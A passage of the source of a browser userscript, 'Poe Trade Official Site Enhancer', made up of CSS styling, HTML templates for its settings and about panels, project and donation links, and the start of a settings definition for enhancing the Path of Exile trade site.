rotate-forever{0%{-webkit-transform:rotate(0);-moz-transform:rotate(0);-ms-transform:rotate(0);-o-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}.gs-loading-spinner{width:30px;height:30px;position:fixed;left:135px;top:135px;z-index:100001;-webkit-animation-duration:.75s;-moz-animation-duration:.75s;animation-duration:.75s;-webkit-animation-iteration-count:infinite;-moz-animation-iteration-count:infinite;animation-iteration-count:infinite;-webkit-animation-name:rotate-forever;-moz-animation-name:rotate-forever;animation-name:rotate-forever;-webkit-animation-timing-function:linear;-moz-animation-timing-function:linear;animation-timing-function:linear;border:8px solid #222;border-right-color:transparent;border-bottom-color:transparent;border-left-color:transparent;border-radius:50%;display:inline-block}.gs-loading-spinner.gs-loaded-half{border-right-color:#222}.gs-loading-spinner.gs-loaded-three-quarters{border-right-color:#222;border-bottom-color:#222}.gs-loading-spinner.gs-loaded-full{border-right-color:#222;border-bottom-color:#222;border-left-color:#222}.gs-loading-counter,.gs-loading-title{position:fixed;width:296px;padding:0 5px;text-align:center;font-weight:700;font-style:italic}.gs-loading-title{top:10px}.gs-loading-counter{bottom:10px}.gs-removable:hover{text-decoration:line-through}.gs-badge-with-icon i{margin-left:4px}.gs-badge-with-icon:not(:hover) i.gs-clickable{color:#6c757d!important}`);
  GM_addStyle(`body,html{height:100%}.currencyClicked{font-style:italic}.item .real-sort:hover{background:#000}.grouped-only,.proplist li.grouped-only{display:none}.grouped .grouped-only,.grouped .proplist li.grouped-only{display:inline}.marg-b-5{margin-bottom:5px}.marg-l-5{margin-left:5px}.marg-r-5{margin-right:5px}.marg-lr-8{margin-left:8px;margin-right:8px}.title a.gs-style{padding:3px 5px;font-size:12px;line-height:12px;top:-6px;position:relative}.chaosEquiv,.gs-item-handle{margin-left:5px;padding:1px 2px;border:1px solid #fff;border-radius:5px;white-space:nowrap}.grouped .resultset .row.gs-group-member{display:none}.gs-style-enabler .title a.gs-style{color:#222}.gs-style-enabler .chaosEquiv,.gs-style-enabler .gs-item-handle,.gs-style-enabler .tippy-backdrop{background-color:#e8eff2;border:1px dashed #111;border-radius:5px}.gs-style-enabler .chaosEquiv,.gs-style-enabler .gs-item-handle,.gs-style-enabler .tippy-content{background-color:#e8eff2;color:#222}.gs-style-enabler a.gs-style:focus,.gs-style-enabler a.gs-style:hover{color:#222}.gs-style-enabler .gs-style{padding:1px 2px}.gs-style-enabler .gs-style.wiki-link{padding:0 2px}.gs-style-enabler .gs-style,.gs-style-enabler .tippy-content{font-family:Roboto,sans-serif}.gs-style-enabler .chaosEquiv,.gs-style-enabler .gs-item-handle{font-family:Oswald,sans-serif}.gs-style-enabler .item .real-sort.gs-style:hover{color:#fff}.gs-style-enabler tr.cell-second td.gs-style,.gs-style-enabler tr.cell-second th.gs-style{background-color:#e8eff2}.gs-style-enabler tr.cell-second th.gs-style{border-bottom:none;border-bottom-left-radius:0;border-bottom-right-radius:0}.gs-style-enabler tr.cell-second td.gs-style{border-top:none;border-top-left-radius:0;border-top-right-radius:0}.gs-style-enabler .hide{display:none}.gs-style-enabler .nowrap{white-space:nowrap}.gs-style-enabler .tippy-content a{color:#222}.gs-style-enabler .form-group.disabled label{color:#6c757d}.gs-load.gs-style,.gs-map-selector.gs-style,.gs-multi.gs-style,.gs-offer-map-selector.gs-style,.gs-save.gs-style{margin-left:7px}.live-search-box.alert-box .gs-load.gs-style,.live-search-box.alert-box .gs-multi.gs-style,.live-search-box.alert-box .gs-save.gs-style{margin-left:0;margin-right:7px}.gs-save.gs-style{padding:0 7px}.gs-load.gs-style{padding:0 5px}.gs-multi.gs-style{padding:0 6px}.gs-map-selector.gs-style,.gs-offer-map-selector.gs-style{padding:0 7px}.tippy-content a{color:#fff}.currencySettings .itemSettingsOnly,.itemSettings .currencySettingsOnly{display:none}.curr-table img{height:22px}.poeOffSite .alert-box.live-search{margin:3px 8px;font-weight:700}.poeOffSite.gs-style-enabler #trade .gs-style a,.poeOffSite.gs-style-enabler #trade .gs-style-light a{color:#09c}.poeOffSite.gs-style-enabler .gs-style-light{font-size:.9em}.poeOffSite.gs-style-enabler div.gs-wrapper{line-height:32px}.poeOffSite.gs-search-tab .gs-multi.hide{display:inline!important}.poeOffSite.gs-exchange-tab .copied{font-style:italic}.poeOffSite.gs-exchange-tab .copied:after{content:' copied'}.poeOffSite #trade .results .search-bar .details .price .gs-wrapper img,.poeOffSite .results #trade .search-bar .details .price .gs-wrapper img,.poeOffSite .results .row .details .price .gs-wrapper img{width:22px;height:22px;vertical-align:sub}.poeOffSite .linkBack{min-width:359px}.poeOffSite .nav-tabs .pteSettings{height:32px;float:right}.poeOffSite .chaosEquiv,.poeOffSite .gs-item-handle{padding:3px 7px;cursor:pointer}.poeOffSite .tippy-content{font-size:1.6em}.poeOffSite .tippy-content .currency-image img{width:22px}.poeOffSite .gs-load.gs-style,.poeOffSite .gs-multi.gs-style,.poeOffSite .gs-save.gs-style{cursor:pointer}.poeOffSite .controls .gs-load,.poeOffSite .controls .gs-multi,.poeOffSite .controls .gs-save{margin-left:0;margin-right:5px}.poeOffSite #trade .controls.saveManager .controls-left{width:25%!important}.poeOffSite #trade .controls.saveManager .controls-right{width:45%!important}.poeOffSite #trade .controls.saveManager .controls-center{width:30%!important}@media (max-width:800px){.poeOffSite #trade .controls.saveManager .controls-left{width:50%!important}.poeOffSite #trade .controls.saveManager .controls-right{width:100%!important}.poeOffSite #trade .controls.saveManager .controls-center{width:50%!important}}.poeOffSite .gs-wikiLink{float:right;position:absolute}.alert-box.live-search{padding:3px 5px}#ms-console-tip{text-align:left}.gs-danger{color:#dc3545!important}.gs-info{color:#17a2b8!important}.gs-warning{color:#856404!important}.gs-success{color:#28a745!important}.gs-quote{color:#6c757d!important;font-style:italic}.middle-list{padding-top:90px;padding-bottom:90px}.frame-load-frame .fixed-bottom,.frame-load-frame .fixed-top,.frame-multi-frame .fixed-bottom,.frame-multi-frame .fixed-top{background:rgba(255,255,255,.95)}.frame-load-frame .table-responsive,.frame-multi-frame .table-responsive{overflow-x:visible}.gs-check-toggler .fa-check-square{display:none}.gs-check-toggler .fa-square{display:inline-block}.gs-check-toggler.gs-checked .fa-check-square{display:inline-block}.gs-check-toggler.gs-checked .fa-square{display:none}.gs-finder-results{min-height:100px;padding-top:11px}.gs-style-enabler #trade a.gs-style{background-color:#e8eff2;color:#222}`);
  GM_addStyle(`.colorPicker{width:16px;height:16px;position:relative;clear:both;margin:0}.colorPicker .track{background:#efefef url(https://raw.githubusercontent.com/ghostscript3r/poe-trade-enhancer/master/images/text-color.png) no-repeat 50% 50%;background-image:url(https://raw.githubusercontent.com/ghostscript3r/poe-trade-enhancer/master/images/text-color.png);height:150px;width:150px;padding:0;position:absolute;cursor:crosshair;float:left;left:-67px;top:-67px;display:none;border:1px solid #ccc;z-index:10;-webkit-border-radius:150px;-moz-border-radius:150px;border-radius:150px}.colorPicker .color{width:16px;height:16px;padding:0;border:1px solid #ccc;display:block;position:relative;z-index:11;background-color:#efefef;-webkit-border-radius:27px;-moz-border-radius:27px;border-radius:27px;cursor:pointer}.colorPicker .colorInner{width:14px;height:14px;-webkit-border-radius:27px;-moz-border-radius:27px;border-radius:27px}.colorPicker .dropdown{list-style:none;display:none;width:27px;position:absolute;top:28px;border:1px solid #ccc;left:0;z-index:1000}.colorPicker .dropdown li{height:25px;cursor:pointer}`);

  var ITEM_SEARCH_CONTAINER = '#search-results-first', ITEM_SEARCH_SELECTOR = 'tbody.item', CURR_SEARCH_CONTAINER = '#content', CURR_SEARCH_SELECTOR = 'div.displayoffer';
var resources = [], cssUrls = ["https://use.fontawesome.com/releases/v5.6.0/css/all.css"], jsUrls = [];
/*"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js",
"https://unpkg.com/tippy.js@3/dist/tippy.all.min.js",
"https://code.jquery.com/jquery-1.11.3.min.js",
"https://cdnjs.cloudflare.com/ajax/libs/bootstrap-3-typeahead/4.0.2/bootstrap3-typeahead.min.js",
"https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.2.1/js/bootstrap.min.js"*/
var settingsIcon;

var addSettingsIconAndCommonInit = function(loc) {
  doOverrides();
  settingsIcon = $(`<a class="gs-style gs-fixTips gs-settings gs-pull-right" onclick="" data-tippy="POE Trade Enhancer settings">PTE <i class="fas fa-cog fa-spin"></i></a>`);
  $('.linkBack').append(settingsIcon);
  tippy(settingsIcon[0], {content: "POE Trade Enhancer settings"});
  $('body').addClass('poeOffSite');
  getAvailableLeagues();
};


var shortDescriptionParagraph = /* html */`
<p class="lead">
  <strong>Adds tons of usefull features to pathofexile.com/trade, from a very easy to use save manager to save and laod your searches and even live search them all in one page, to an auto sort by real currency values (from poe.ninja), passing from gems max quality cost and more. I have some other very good idea for features to add, I'll gladly push them forward if I see people start using this.</strong>
  <br /><em><a href="https://github.com/ghostscript3r/poe-trade-official-site-enhancer">github page</a></em>
</p>
`

var roadmapParagraph = /* html */`
<div class="">
  <h3 class="">Roadmap</h3>
  <p class="lead">
    I'd like to see some votes before starting on new features. I already put some ideas there, but I'd like to see more from you. If nothing appens there, the next thing will probably be a smart mod and ranges selector based on poe.affix values, because choosing a mod that gives no results because the mod for the type of item I'm searching is spelled slightly differente is one of the things I find more frustrating of this interface.
    <br />
    <br />
    <a href="https://www.tricider.com/admin/36HWcTk5RhZ/DawSV0oQX7b" target="_blank">New features request and vote</a>
    <br />
    <a href="https://trello.com/b/x77l2HzX/poe-trade-enhancer" target="_blank">Project board</a>
  </p>
</div>
`

var issueTrackingParagraph = /* html */`
<div class="">
  <h3 class="">Issue tracking</h3>
  <p class="lead">
    <a href="https://github.com/ghostscript3r/poe-trade-official-site-enhancer/issues" target="_blank">Issue tracking page</a><br />
    <em>Use only GitHub please. The other repositories section will be monitored occasionally at best. Also avoid sending bug report directly to my mail, there's a very high probability they'll just be ignored that way.</em>
  </p>
</div>
`

var changeLogParagraph = /* html */`
<div class="">
  <h3 class="">Changelog & Releases</h3>
  <p><a href="https://github.com/ghostscript3r/poe-trade-official-site-enhancer/releases" target="_blank">GitHub Changelog</a></p>
</div>
`
var licenseParagraph = /* html */`
<div class="">
  <h3 class="">License</h3>
  <p><a href="https://creativecommons.org/licenses/by-sa/4.0/" target="_blank">https://creativecommons.org/licenses/by-sa/4.0/</a></p>
</div>
`

var repositoriesParagraph = /* html */`
<div class="">
  <h3 class="">Repositories</h3>
  <p>
    <a href="https://github.com/ghostscript3r/poe-trade-official-site-enhancer" target="_blank">GitHub</a><br />
    <a href="https://greasyfork.org/scripts/389702-poe-trade-official-site-enhancer" target="_blank">GreasyFork</a><br />
    <a href="https://openuserjs.org/scripts/ghostscript3r/poe-trade-official-site-enhancer" target="_blank">OpenUserJS</a>
  </p>
</div>
`

var ghostscripterParagraph = /* html */`
<div class="">
  <h2 class="">GhostScripter</h2>
  <p>I started enhancing pages using Userscripts (Tampermonkey/Greasemonkey) for myself and some friends. I always found very frustrating when a site I use very often makes me click around for tasks that should be done with one click. And since I'm a web developer discovering that I could easily enhance all those sites has literally opened a new world to me.</p>
  <p>First works where crude but very effective in solving minor problems and unusabilities of various sites and apps.</p>
  <p>Now I decided to polish and publish the most usefull of them and start taking request on larger scale.</p>
  <p>Basically I want to fight frustration, a big monster that permeates the internet.</p>
  <p>Basically if there's a site or web application with some annoying behaviours (5 clicks when you would like to do just 1, that sort of things), <a href="https://www.tricider.com/admin/35BH7CcohrB/EFXf0Ei7SjR" target="_blank">try to ask for a new userscript here</a>. It might be much easier then you think. Obviously patron and supporters requests will "bear more weight"... I do not guarantee that if you donate I will answer your request ASAP. Many factors will determine what to do next, like complexity of the request, prioritization of bugfixes, personal life, etcetera... But I'm pretty sure that any supporter request will be given a lot of attention. For this reason if you are a patron you would probably do better by directly writing to me at <a href="mailto:ghostscript3r@gmail.com">ghostscript3r@gmail.com</a>.</p>
  <p>For a list of all projects published or planned visit <a href="https://www.patreon.com/ghostscripter" target="_blank">my patreon page</a>.</p>
</div>
`
var donateParagraph = /* html */`
<p class="mt-3 mb-0 plr-1 text-center text-info font-italic">
  If you like this script and wish it's kept working or wish new features to be added, consider contributing somehow.<br />
  Consider that by nature UserScripts need maintenance. I will never have any control on how or when the site I'm modifing will change. I try to develop theese scripts as smart as possible so that if anything changes they at least don't make the original unusable, but as the site changes the script will need to adapt to continue working. So if you find this usefull and wish to continue using it, really consider supporting me. If no one will, I'm pretty sure I will abandon theese projects sooner or later, and after that it's only a matter of time before it stop working.<br />
  If not with a donation you can contribute by reccomending it to your friends, or even just by requesting new features or scripts, that might in turn attract new users.<br />
  Check my page on <a target="_top" href="https://www.patreon.com/ghostscripter">Patreon</a> and follow directions from there on how to request new features.
</p>
`

var frameTemplate = /* html */`
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Oswald|Roboto" crossorigin="anonymous" />
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.0/css/all.css" crossorigin="anonymous" />
  <script>
    var fr = document.getElementById('settings-frame');
    var doc = document;
    if (fr) doc = fr.document || fr.contentDocument || fr.contentWindow.document;
    var scripts = [
      // "https://code.jquery.com/jquery-1.11.3.min.js",
      // "https://greasyfork.org/scripts/387585-jqueryeditable/code/jqueryeditable.js?version=717975",
      // "https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js",
      // "https://unpkg.com/tippy.js@3/dist/tippy.all.min.js",
      // "https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.2.1/js/bootstrap.min.js"
    ];
    var i = 0;

    var writeScript = function() {
      var s = doc.createElement("script");
      s.type = "text/javascript";
      s.src = scripts[i];
      i++;
      s.onload = loop;
      doc.head.appendChild(s);
    }
    var loop = function() {
      // console.log(window);
      if (i < scripts.length) {
        writeScript();
      } else {
        // setTimeout(function(){
        //   console.log("END");
        //   console.log(window);
        //   console.log(typeof $().modal);
        // }, 3000);
      }
    };
    loop();
  </script>
  <style>.gs-style-enabler .gs-frame,.gs-style-enabler .gs-style{background-color:#e8eff2;border:1px dashed #111;border-radius:5px;padding:5px}.gs-style-enabler .gs-style{background-color:#e8eff2;color:#222;padding:1px 2px}.gs-style-enabler .gs-style a{color:#09c;text-decoration:underline dashed}.gs-style-enabler .gs-style.gs-warning{color:#856404;background-color:#fff3cd;border-color:#856404}.gs-style-enabler .gs-style-light{font-size:.8em;font-style:italic;opacity:.9;background-color:#fff;line-height:1.2em}.gs-style-enabler .gs-style-light.gs-style{padding:1px 5px}.gs-style a,a.gs-style{cursor:pointer}.gs-style.gs-button{margin-right:5px;padding:2px 5px}body.frame-setting-frame{background-color:#e8eff2}.gs-clickable,a i.fas{cursor:pointer}.gs-frame{width:90%;min-height:300px;max-width:900px;height:85%;position:fixed;left:50%;transform:translateX(-50%);top:7.5%;z-index:100001}.gs-backdrop{width:100%;min-height:300px;height:100%;position:fixed;left:0;top:0;z-index:100000;background:rgba(255,255,255,.3)}.hide{display:none}.nowrap{white-space:nowrap}.gs-pull-right{float:right}.gs-pull-left{float:left}.tippy-content a{color:#222}.patreon-button img{height:47px;border-radius:1.5rem}.paypal-form{padding-bottom:0;margin-bottom:-6px}#saved-alert{position:fixed;z-index:0;padding-left:0;padding-right:30px}.modal-dialog.modal-xl{max-width:90%}.gs-loading{width:300px;height:300px;position:fixed;left:50%;top:50%;z-index:100001;transform:translateX(-50%) translateY(-50%)}@-webkit-keyframes rotate-forever{0%{-webkit-transform:rotate(0);-moz-transform:rotate(0);-ms-transform:rotate(0);-o-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}@-moz-keyframes rotate-forever{0%{-webkit-transform:rotate(0);-moz-transform:rotate(0);-ms-transform:rotate(0);-o-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes rotate-forever{0%{-webkit-transform:rotate(0);-moz-transform:rotate(0);-ms-transform:rotate(0);-o-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}.gs-loading-spinner{width:30px;height:30px;position:fixed;left:135px;top:135px;z-index:100001;-webkit-animation-duration:.75s;-moz-animation-duration:.75s;animation-duration:.75s;-webkit-animation-iteration-count:infinite;-moz-animation-iteration-count:infinite;animation-iteration-count:infinite;-webkit-animation-name:rotate-forever;-moz-animation-name:rotate-forever;animation-name:rotate-forever;-webkit-animation-timing-function:linear;-moz-animation-timing-function:linear;animation-timing-function:linear;border:8px solid #222;border-right-color:transparent;border-bottom-color:transparent;border-left-color:transparent;border-radius:50%;display:inline-block}.gs-loading-spinner.gs-loaded-half{border-right-color:#222}.gs-loading-spinner.gs-loaded-three-quarters{border-right-color:#222;border-bottom-color:#222}.gs-loading-spinner.gs-loaded-full{border-right-color:#222;border-bottom-color:#222;border-left-color:#222}.gs-loading-counter,.gs-loading-title{position:fixed;width:296px;padding:0 5px;text-align:center;font-weight:700;font-style:italic}.gs-loading-title{top:10px}.gs-loading-counter{bottom:10px}.gs-removable:hover{text-decoration:line-through}.gs-badge-with-icon i{margin-left:4px}.gs-badge-with-icon:not(:hover) i.gs-clickable{color:#6c757d!important}</style>
  <style>body,html{height:100%}.currencyClicked{font-style:italic}.item .real-sort:hover{background:#000}.grouped-only,.proplist li.grouped-only{display:none}.grouped .grouped-only,.grouped .proplist li.grouped-only{display:inline}.marg-b-5{margin-bottom:5px}.marg-l-5{margin-left:5px}.marg-r-5{margin-right:5px}.marg-lr-8{margin-left:8px;margin-right:8px}.title a.gs-style{padding:3px 5px;font-size:12px;line-height:12px;top:-6px;position:relative}.chaosEquiv,.gs-item-handle{margin-left:5px;padding:1px 2px;border:1px solid #fff;border-radius:5px;white-space:nowrap}.grouped .resultset .row.gs-group-member{display:none}.gs-style-enabler .title a.gs-style{color:#222}.gs-style-enabler .chaosEquiv,.gs-style-enabler .gs-item-handle,.gs-style-enabler .tippy-backdrop{background-color:#e8eff2;border:1px dashed #111;border-radius:5px}.gs-style-enabler .chaosEquiv,.gs-style-enabler .gs-item-handle,.gs-style-enabler .tippy-content{background-color:#e8eff2;color:#222}.gs-style-enabler a.gs-style:focus,.gs-style-enabler a.gs-style:hover{color:#222}.gs-style-enabler .gs-style{padding:1px 2px}.gs-style-enabler .gs-style.wiki-link{padding:0 2px}.gs-style-enabler .gs-style,.gs-style-enabler .tippy-content{font-family:Roboto,sans-serif}.gs-style-enabler .chaosEquiv,.gs-style-enabler .gs-item-handle{font-family:Oswald,sans-serif}.gs-style-enabler .item .real-sort.gs-style:hover{color:#fff}.gs-style-enabler tr.cell-second td.gs-style,.gs-style-enabler tr.cell-second th.gs-style{background-color:#e8eff2}.gs-style-enabler tr.cell-second th.gs-style{border-bottom:none;border-bottom-left-radius:0;border-bottom-right-radius:0}.gs-style-enabler tr.cell-second td.gs-style{border-top:none;border-top-left-radius:0;border-top-right-radius:0}.gs-style-enabler .hide{display:none}.gs-style-enabler .nowrap{white-space:nowrap}.gs-style-enabler .tippy-content a{color:#222}.gs-style-enabler .form-group.disabled label{color:#6c757d}.gs-load.gs-style,.gs-map-selector.gs-style,.gs-multi.gs-style,.gs-offer-map-selector.gs-style,.gs-save.gs-style{margin-left:7px}.live-search-box.alert-box .gs-load.gs-style,.live-search-box.alert-box .gs-multi.gs-style,.live-search-box.alert-box .gs-save.gs-style{margin-left:0;margin-right:7px}.gs-save.gs-style{padding:0 7px}.gs-load.gs-style{padding:0 5px}.gs-multi.gs-style{padding:0 6px}.gs-map-selector.gs-style,.gs-offer-map-selector.gs-style{padding:0 7px}.tippy-content a{color:#fff}.currencySettings .itemSettingsOnly,.itemSettings .currencySettingsOnly{display:none}.curr-table img{height:22px}.poeOffSite .alert-box.live-search{margin:3px 8px;font-weight:700}.poeOffSite.gs-style-enabler #trade .gs-style a,.poeOffSite.gs-style-enabler #trade .gs-style-light a{color:#09c}.poeOffSite.gs-style-enabler .gs-style-light{font-size:.9em}.poeOffSite.gs-style-enabler div.gs-wrapper{line-height:32px}.poeOffSite.gs-search-tab .gs-multi.hide{display:inline!important}.poeOffSite.gs-exchange-tab .copied{font-style:italic}.poeOffSite.gs-exchange-tab .copied:after{content:' copied'}.poeOffSite #trade .results .search-bar .details .price .gs-wrapper img,.poeOffSite .results #trade .search-bar .details .price .gs-wrapper img,.poeOffSite .results .row .details .price .gs-wrapper img{width:22px;height:22px;vertical-align:sub}.poeOffSite .linkBack{min-width:359px}.poeOffSite .nav-tabs .pteSettings{height:32px;float:right}.poeOffSite .chaosEquiv,.poeOffSite .gs-item-handle{padding:3px 7px;cursor:pointer}.poeOffSite .tippy-content{font-size:1.6em}.poeOffSite .tippy-content .currency-image img{width:22px}.poeOffSite .gs-load.gs-style,.poeOffSite .gs-multi.gs-style,.poeOffSite .gs-save.gs-style{cursor:pointer}.poeOffSite .controls .gs-load,.poeOffSite .controls .gs-multi,.poeOffSite .controls .gs-save{margin-left:0;margin-right:5px}.poeOffSite #trade .controls.saveManager .controls-left{width:25%!important}.poeOffSite #trade .controls.saveManager .controls-right{width:45%!important}.poeOffSite #trade .controls.saveManager .controls-center{width:30%!important}@media (max-width:800px){.poeOffSite #trade .controls.saveManager .controls-left{width:50%!important}.poeOffSite #trade .controls.saveManager .controls-right{width:100%!important}.poeOffSite #trade .controls.saveManager .controls-center{width:50%!important}}.poeOffSite .gs-wikiLink{float:right;position:absolute}.alert-box.live-search{padding:3px 5px}#ms-console-tip{text-align:left}.gs-danger{color:#dc3545!important}.gs-info{color:#17a2b8!important}.gs-warning{color:#856404!important}.gs-success{color:#28a745!important}.gs-quote{color:#6c757d!important;font-style:italic}.middle-list{padding-top:90px;padding-bottom:90px}.frame-load-frame .fixed-bottom,.frame-load-frame .fixed-top,.frame-multi-frame .fixed-bottom,.frame-multi-frame .fixed-top{background:rgba(255,255,255,.95)}.frame-load-frame .table-responsive,.frame-multi-frame .table-responsive{overflow-x:visible}.gs-check-toggler .fa-check-square{display:none}.gs-check-toggler .fa-square{display:inline-block}.gs-check-toggler.gs-checked .fa-check-square{display:inline-block}.gs-check-toggler.gs-checked .fa-square{display:none}.gs-finder-results{min-height:100px;padding-top:11px}.gs-style-enabler #trade a.gs-style{background-color:#e8eff2;color:#222}</style>
  <style>.colorPicker{width:16px;height:16px;position:relative;clear:both;margin:0}.colorPicker .track{background:#efefef url(https://raw.githubusercontent.com/ghostscript3r/poe-trade-enhancer/master/images/text-color.png) no-repeat 50% 50%;background-image:url(https://raw.githubusercontent.com/ghostscript3r/poe-trade-enhancer/master/images/text-color.png);height:150px;width:150px;padding:0;position:absolute;cursor:crosshair;float:left;left:-67px;top:-67px;display:none;border:1px solid #ccc;z-index:10;-webkit-border-radius:150px;-moz-border-radius:150px;border-radius:150px}.colorPicker .color{width:16px;height:16px;padding:0;border:1px solid #ccc;display:block;position:relative;z-index:11;background-color:#efefef;-webkit-border-radius:27px;-moz-border-radius:27px;border-radius:27px;cursor:pointer}.colorPicker .colorInner{width:14px;height:14px;-webkit-border-radius:27px;-moz-border-radius:27px;border-radius:27px}.colorPicker .dropdown{list-style:none;display:none;width:27px;position:absolute;top:28px;border:1px solid #ccc;left:0;z-index:1000}.colorPicker .dropdown li{height:25px;cursor:pointer}</style>
`;

var donateTemplate = /* html */`
<div class="card">
  <div class="card-body">
    <h3 class="text-center card-title">Please consider donating</h3>
    <div class="row">
      <div class="col-sm-12 col-md-6 text-center">
        <div class="card border-primary">
          <div class="card-body">
            <h5 class="card-title">Patreon</h5>
            <a href="https://www.patreon.com/bePatron?u=15819567" target="_top" class="patreon-button">
              <img src="https://c5.patreon.com/external/logo/become_a_patron_button@2x.png" class="" />
            </a>
          </div>
        </div>
      </div>
      <div class="col-sm-12 col-md-6 text-center">
        <div class="card border-primary">
          <div class="card-body">
            <h5 class="card-title">PayPal</h5>
            <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top" class="paypal-form">
              <input type="hidden" name="cmd" value="_s-xclick" />
              <input type="hidden" name="hosted_button_id" value="L5JZS33ADMBQW" />
              <input type="image" src="https://www.paypalobjects.com/en_US/IT/i/btn/btn_donateCC_LG.gif" border="0" name="submit" title="PayPal - The safer, easier way to pay online!" alt="Donate with PayPal button" />
              <img alt="" border="0" src="https://www.paypal.com/en_IT/i/scr/pixel.gif" width="1" height="1" />
            </form>
          </div>
        </div>
      </div>
    </div>
    ${donateParagraph}
  </div>
</div>
`;

var frameContent = /* html */ `
  <div class="container pt-1">
    <nav class="navbar navbar-dark bg-dark navbar-expand">
      <a class="navbar-brand" href onclick="return false;">Poe Trade Official Site Enhancer</a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav nav" id="myTab" role="tablist">
          <li class="nav-item">
            <a class="nav-link active" id="home-tab" data-toggle="tab" href="#home" role="tab" aria-controls="home" aria-selected="true" onclick="return false;">About</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" id="settings-tab" data-toggle="tab" href="#settings" role="tab" aria-controls="settings" aria-selected="false" onclick="return false;">Settings</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" id="currency-tab" data-toggle="tab" href="#currency" role="tab" aria-controls="currency" aria-selected="false" onclick="return false;">Currencies</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" id="ghostscripter-tab" data-toggle="tab" href="#ghostscripter" role="tab" aria-controls="ghostscripter" aria-selected="false" onclick="return false;">GhostScripter</a>
          </li>
        </ul>
      </div>
    </nav>
    <div class="tab-content" id="myTabContent">
      <div class="tab-pane fade show active" id="home" role="tabpanel" aria-labelledby="home-tab">
        <div class="">
          <h2 class="">Poe Trade Official Site Enhancer <small class="text-secondary font-italic font-weight-light">v. 1.4.25</small></h2>
          ${shortDescriptionParagraph}
          <hr class="my-4">
          ${donateTemplate}
        </div>
        <hr class="my-4">
        <div class="">
          <h2 class="">Features</h2>
          <dl id="features-list">
          </dl>
        </div>
        <div class="">
        ${roadmapParagraph}
        </div>
        <div class="">
        ${issueTrackingParagraph}
        </div>
        <div class="">
        ${changeLogParagraph}
        </div>
        <div class="">
        ${repositoriesParagraph}
        </div>
        <div class="">
        ${licenseParagraph}
        </div>
    </div>
    <div class="tab-pane fade" id="settings" role="tabpanel" aria-labelledby="settings-tab">
      <div class="container" id="saved-alert" style="opacity: 0;">
        <div class="alert alert-light" role="alert">
          all changes saved
        </div>
      </div>
      <div class="container currencySettingsOnly">
        <div class="alert alert-warning" role="alert">
          Due to limitations on localstorage over different domains, currency and item search settings are completely separated
        </div>
      </div>
      <form id="settings-form">
      </form>
    </div>
    <div class="tab-pane fade" id="currency" role="tabpanel" aria-labelledby="currency-tab">
      <ul class="nav nav-tabs" id="myCurrTab" role="tablist">
        <li class="nav-item">
          <a class="nav-link" id="preloaded-tab" data-toggle="tab" href="#preloaded-pane" role="tab" aria-controls="preloaded-pane" aria-selected="true">Preloaded</a>
        </li>
        <li class="nav-item">
          <a class="nav-link disabled" id="leagues-tab" data-toggle="tab" href="#leagues-pane" role="tab" aria-controls="leagues-pane" aria-selected="false">Leagues</a>
        </li>
      </ul>
      <p class="preloaded-info">Using preloaded values corresponding to Standard league values at the moment of the last major release. You can change these values manually or reset them. It is highly reccomended to enable currency load from <b><a target="_blank" href="https://poe.ninja/">poe.ninja</a></b> in settings tab or disable any currency reordering so that the original poe.trade order is untouched.</p>
      <p class="loaded-info d-none">Currency values loaded from <b><a target="_blank" href="https://poe.ninja/">poe.ninja</a></b>. You can change them manually but they will be overwritten again the next time they are refreshed.</p>
      <div class="tab-content" id="myCurrTabContent">
        <div class="tab-pane fade show active" id="preloaded-pane" role="tabpanel" aria-labelledby="preloaded-tab">
        </div>
        <div class="tab-pane fade" id="leagues-pane" role="tabpanel" aria-labelledby="leagues-tab"></div>
      </div>
    </div>
    <div class="tab-pane fade" id="ghostscripter" role="tabpanel" aria-labelledby="ghostscripter-tab">
      ${ghostscripterParagraph}
    </div>
  </div>
  <div class="modal fade" id="showcaseModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="exampleModalLabel">Features Showcase</h5>
          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
        </div>
        <div class="modal-footer">
        </div>
      </div>
    </div>
  </div>
</div>
`;


  var paragraphs = {
  parag1: {title: 'Item Search', featureTitle: 'Item Search enhancements', class: ''},
  parag2: {title: 'Currency Search', featureTitle: 'Currency Search enhancements', class: ''}
}

var settings = {
  loadImmediately: {
    type: 'Boolean', default: false, class: 'd-none',
